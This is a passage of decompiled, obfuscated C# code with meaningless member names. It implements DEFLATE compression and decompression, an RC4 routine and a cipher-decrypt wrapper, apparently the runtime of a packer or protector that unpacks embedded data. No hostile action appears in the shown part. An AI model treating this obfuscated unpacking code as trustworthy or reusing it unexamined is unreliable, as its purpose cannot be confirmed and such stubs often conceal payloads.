					*(int*)ptr = Class22.smethod_57(class12_0.class13_0, class12_0.int_18);
					if (*(int*)ptr < 0)
					{
						return false;
					}
					Class22.smethod_50(class12_0.class13_0, class12_0.int_18);
					class12_0.int_19 += *(int*)ptr;
				}
				class12_0.int_17 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class22.smethod_53(class12_0.class15_1, class12_0.class13_0);
				if (num2 >= 0)
				{
					class12_0.int_20 = Class11.Class12.int_15[num2];
					class12_0.int_18 = Class11.Class12.int_16[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class12_0.int_18 > 0)
				{
					class12_0.int_17 = 10;
					*(int*)((byte*)ptr + 4) = Class22.smethod_57(class12_0.class13_0, class12_0.int_18);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class22.smethod_50(class12_0.class13_0, class12_0.int_18);
					class12_0.int_20 += *(int*)((byte*)ptr + 4);
				}
				Class22.smethod_24(class12_0.class14_0, class12_0.int_19, class12_0.int_20);
				num -= class12_0.int_19;
				class12_0.int_17 = 7;
				break;
			}
		}
		return true;
	}

	unsafe static void smethod_56(Class11.Class20 class20_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class20_0.byte_0, 32768, class20_0.byte_0, 0, 32768);
		class20_0.int_11 -= 32768;
		class20_0.int_14 -= 32768;
		class20_0.int_13 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class20_0.short_0[*(int*)ptr] & 0xFFFF;
			class20_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class20_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class20_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static int smethod_57(Class11.Class13 n, int int_0)
	{
		if (n.int_2 < int_0)
		{
			if (n.int_0 == n.int_1)
			{
				return -1;
			}
			n.uint_0 |= (uint)(((n.byte_0[n.int_0++] & 0xFF) | ((n.byte_0[n.int_0++] & 0xFF) << 8)) << n.int_2);
			n.int_2 += 16;
		}
		return (int)(n.uint_0 & ((1 << int_0) - 1));
	}

	static int smethod_58(Class11.Stream0 stream0_0)
	{
		return Class22.smethod_26(stream0_0) | (Class22.smethod_26(stream0_0) << 16);
	}

	static void smethod_59(byte[] buffer, Class11.Class20 class20_0)
	{
		class20_0.byte_1 = buffer;
		class20_0.int_17 = 0;
		class20_0.int_18 = buffer.Length;
	}

	static void smethod_60(Class10 class10_0)
	{
		class10_0.type_0.GetMethod("Clear")!.Invoke(class10_0.object_0, new object[0]);
	}

	static short smethod_61(int toReverse)
	{
		return (short)((Class11.Class18.byte_0[toReverse & 0xF] << 12) | (Class11.Class18.byte_0[(toReverse >> 4) & 0xF] << 8) | (Class11.Class18.byte_0[(toReverse >> 8) & 0xF] << 4) | Class11.Class18.byte_0[toReverse >> 12]);
	}

	static bool smethod_62(bool flush, bool finish, Class11.Class20 class20_0)
	{
		bool flag;
		do
		{
			Class22.smethod_49(class20_0);
			flag = Class22.smethod_77(flush && class20_0.int_17 == class20_0.int_18, finish, class20_0);
		}
		while (class20_0.class21_0.int_1 == 0 && flag);
		return flag;
	}

	static void smethod_63(int value, Class11.Stream0 stream0_0)
	{
		Class22.smethod_5(stream0_0, value);
		Class22.smethod_5(stream0_0, value >> 16);
	}

	static void smethod_64(Class11.Class17 class17_0)
	{
		class17_0.int_6 |= 12;
	}

	unsafe static int smethod_65(Class11.Class14 input, Class11.Class13 len, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - input.int_3), len.AvailableBytes);
		*(int*)((byte*)ptr + 4) = 32768 - input.int_2;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class22.smethod_36(len, input.byte_0, input.int_2, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class22.smethod_36(len, input.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class22.smethod_36(len, input.byte_0, input.int_2, int_0);
		}
		input.int_2 = (input.int_2 + *(int*)ptr) & 0x7FFF;
		input.int_3 += *(int*)ptr;
		return *(int*)ptr;
	}

	static int smethod_66(Class11.Class20 class20_0)
	{
		int num = ((class20_0.int_10 << 5) ^ class20_0.byte_0[class20_0.int_14 + 2]) & 0x7FFF;
		short num2 = (class20_0.short_1[class20_0.int_14 & 0x7FFF] = class20_0.short_0[num]);
		class20_0.short_0[num] = (short)class20_0.int_14;
		class20_0.int_10 = num;
		return num2 & 0xFFFF;
	}

	static void smethod_67(byte[] buffer, Class11.Class17 class17_0)
	{
		Class22.smethod_59(buffer, class17_0.class20_0);
	}

	static void smethod_68(Class11.Class20 class20_0)
	{
		class20_0.int_10 = (class20_0.byte_0[class20_0.int_14] << 5) ^ class20_0.byte_0[class20_0.int_14 + 1];
	}

	unsafe static bool smethod_69(Class11.Class12 class12_0)
	{
		void* ptr = stackalloc byte[12];
		switch (class12_0.int_17)
		{
		case 2:
			if (class12_0.bool_0)
			{
				class12_0.int_17 = 12;
				return false;
			}
			*(int*)ptr = Class22.smethod_57(class12_0.class13_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class22.smethod_50(class12_0.class13_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class12_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class22.smethod_15(class12_0.class13_0);
				class12_0.int_17 = 3;
				break;
			case 1:
				class12_0.class15_0 = Class11.Class15.class15_0;
				class12_0.class15_1 = Class11.Class15.class15_1;
				class12_0.int_17 = 7;
				break;
			case 2:
				class12_0.class16_0 = new Class11.Class16();
				class12_0.int_17 = 6;
				break;
			}
			return true;
		case 3:
			if ((class12_0.int_21 = Class22.smethod_57(class12_0.class13_0, 16)) < 0)
			{
				return false;
			}
			Class22.smethod_50(class12_0.class13_0, 16);
			class12_0.int_17 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class22.smethod_57(class12_0.class13_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				return false;
			}
			Class22.smethod_50(class12_0.class13_0, 16);
			class12_0.int_17 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class22.smethod_65(class12_0.class14_0, class12_0.class13_0, class12_0.int_21);
			class12_0.int_21 -= *(int*)((byte*)ptr + 8);
			if (class12_0.int_21 == 0)
			{
				class12_0.int_17 = 2;
				return true;
			}
			return !class12_0.class13_0.IsNeedingInput;
		case 6:
			if (!Class22.smethod_11(class12_0.class16_0, class12_0.class13_0))
			{
				return false;
			}
			class12_0.class15_0 = Class22.smethod_9(class12_0.class16_0);
			class12_0.class15_1 = Class22.smethod_13(class12_0.class16_0);
			class12_0.int_17 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class22.smethod_55(class12_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	unsafe static byte[] smethod_70(byte[] bytes, string Key)
	{
		void* ptr = stackalloc byte[9];
		byte[] bytes2 = Encoding.Default.GetBytes(Key);
		byte[] array = new byte[256];
		byte[] array2 = new byte[256];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = (byte)i;
			array2[i] = bytes2[i % bytes2.GetLength(0)];
		}
		int num = 0;
		for (i = 0; i < 256; i++)
		{
			num = (num + array[i] + array2[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
		}
		num = 0;
		i = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < bytes.GetLength(0))
		{
			i = (i + 1) % 256;
			num = (num + array[i]) % 256;
			((byte*)ptr)[8] = array[i];
			array[i] = array[num];
			array[num] = ((byte*)ptr)[8];
			*(int*)((byte*)ptr + 4) = (array[i] + array[num]) % 256;
			bytes[*(int*)ptr] ^= array[*(int*)((byte*)ptr + 4)];
			(*(int*)ptr)++;
		}
		return bytes;
	}

	static void smethod_71(int s, Class11.Class21 class21_0)
	{
		class21_0.byte_0[class21_0.int_1++] = (byte)s;
		class21_0.byte_0[class21_0.int_1++] = (byte)(s >> 8);
	}

	unsafe static int smethod_72(int output, int offset, Class11.Class14 len, byte[] byte_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = len.int_2;
		if (offset > len.int_3)
		{
			offset = len.int_3;
		}
		else
		{
			*(int*)ptr = (len.int_2 - len.int_3 + offset) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = offset;
		*(int*)((byte*)ptr + 8) = offset - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(len.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, output, *(int*)((byte*)ptr + 8));
			output += *(int*)((byte*)ptr + 8);
			offset = *(int*)ptr;
		}
		Array.Copy(len.byte_0, *(int*)ptr - offset, byte_0, output, offset);
		len.int_3 -= *(int*)((byte*)ptr + 4);
		if (len.int_3 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static void smethod_73(Class11.Class21 class21_0)
	{
		if (class21_0.int_2 > 0)
		{
			class21_0.byte_0[class21_0.int_1++] = (byte)class21_0.uint_0;
			if (class21_0.int_2 > 8)
			{
				class21_0.byte_0[class21_0.int_1++] = (byte)(class21_0.uint_0 >> 8);
			}
		}
		class21_0.uint_0 = 0u;
		class21_0.int_2 = 0;
	}

	static byte[] smethod_74(byte[] buffer, byte[] key, byte[] iv)
	{
		return Class22.smethod_27(3, key, iv, buffer);
	}

	static void smethod_75(byte[] stCodes, short[] stLength, Class11.Class18.Class19 class19_0)
	{
		class19_0.short_1 = stLength;
		class19_0.byte_0 = stCodes;
	}

	static void smethod_76(Class11.Class14 abyte, int int_0)
	{
		if (abyte.int_3++ == 32768)
		{
			throw new InvalidOperationException();
		}
		abyte.byte_0[abyte.int_2++] = (byte)int_0;
		abyte.int_2 &= 32767;
	}

	unsafe static bool smethod_77(bool flush, bool finish, Class11.Class20 class20_0)
	{
		void* ptr = stackalloc byte[28];
		if (class20_0.int_15 < 262 && !flush)
		{
			return false;
		}
		Class11.Class18 class18_3;
		byte[] byte_;
		do
		{
			if (class20_0.int_15 >= 262 || flush)
			{
				if (class20_0.int_15 != 0)
				{
					if (class20_0.int_14 >= 65274)
					{
						Class22.smethod_56(class20_0);
					}
					*(int*)ptr = class20_0.int_11;
					int int_ = class20_0.int_12;
					if (class20_0.int_15 >= 3)
					{
						*(int*)((byte*)ptr + 4) = Class22.smethod_66(class20_0);
						if (*(int*)((byte*)ptr + 4) != 0 && class20_0.int_14 - *(int*)((byte*)ptr + 4) <= 32506 && Class22.smethod_42(class20_0, *(int*)((byte*)ptr + 4)) && class20_0.int_12 <= 5 && class20_0.int_12 == 3 && class20_0.int_14 - class20_0.int_11 > 4096)
						{
							class20_0.int_12 = 2;
						}
					}
					if (int_ >= 3 && class20_0.int_12 <= int_)
					{
						Class11.Class18 class18_ = class20_0.class18_0;
						*(int*)((byte*)ptr + 20) = class20_0.int_14 - 1 - *(int*)ptr;
						Class22.smethod_19(int_, class18_, *(int*)((byte*)ptr + 20));
						int_ -= 2;
						do
						{
							class20_0.int_14++;
							class20_0.int_15--;
							if (class20_0.int_15 >= 3)
							{
								Class22.smethod_66(class20_0);
							}
						}
						while (--int_ > 0);
						class20_0.int_14++;
						class20_0.int_15--;
						class20_0.bool_0 = false;
						class20_0.int_12 = 2;
					}
					else
					{
						if (class20_0.bool_0)
						{
							Class11.Class18 class18_2 = class20_0.class18_0;
							*(int*)((byte*)ptr + 16) = class20_0.byte_0[class20_0.int_14 - 1] & 0xFF;
							Class22.smethod_32(*(int*)((byte*)ptr + 16), class18_2);
						}
						class20_0.bool_0 = true;
						class20_0.int_14++;
						class20_0.int_15--;
					}
					continue;
				}
				if (class20_0.bool_0)
				{
					Class11.Class18 class18_2 = class20_0.class18_0;
					*(int*)((byte*)ptr + 16) = class20_0.byte_0[class20_0.int_14 - 1] & 0xFF;
					Class22.smethod_32(*(int*)((byte*)ptr + 16), class18_2);
				}
				class20_0.bool_0 = false;
				class18_3 = class20_0.class18_0;
				byte_ = class20_0.byte_0;
				*(int*)((byte*)ptr + 12) = class20_0.int_13;
				*(int*)((byte*)ptr + 24) = class20_0.int_14 - class20_0.int_13;
				Class22.smethod_46(*(int*)((byte*)ptr + 12), finish, byte_, class18_3, *(int*)((byte*)ptr + 24));
				class20_0.int_13 = class20_0.int_14;
				return false;
			}
			return true;
		}
		while (class20_0.class18_0.int_9 < 16384);
		*(int*)((byte*)ptr + 8) = class20_0.int_14 - class20_0.int_13;
		if (class20_0.bool_0)
		{
			(*(int*)((byte*)ptr + 8))--;
		}
		bool flag = finish && class20_0.int_15 == 0 && !class20_0.bool_0;
		class18_3 = class20_0.class18_0;
		byte_ = class20_0.byte_0;
		*(int*)((byte*)ptr + 12) = class20_0.int_13;
		Class22.smethod_46(*(int*)((byte*)ptr + 12), flag, byte_, class18_3, *(int*)((byte*)ptr + 8));
		class20_0.int_13 += *(int*)((byte*)ptr + 8);
		return !flag;
	}
}
